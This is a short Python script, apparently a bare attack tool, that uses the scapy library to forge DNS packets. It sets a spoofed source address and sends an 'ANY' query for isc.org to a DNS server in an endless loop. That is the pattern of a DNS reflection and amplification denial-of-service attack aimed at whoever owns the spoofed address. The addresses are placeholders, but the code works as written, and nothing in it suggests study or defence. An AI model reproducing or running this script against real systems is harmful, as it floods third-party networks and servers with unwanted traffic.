from scapy.all import *
fakesrc = 'x.x.x.x'
server = 'x.x.x.x'

mypacket = IP(dst=server, src=fakesrc)/UDP(dport=53, sport=8000)/DNS(qd=DNSQR(qname="isc.org", qtype="ANY"))
send(mypacket, loop=True)
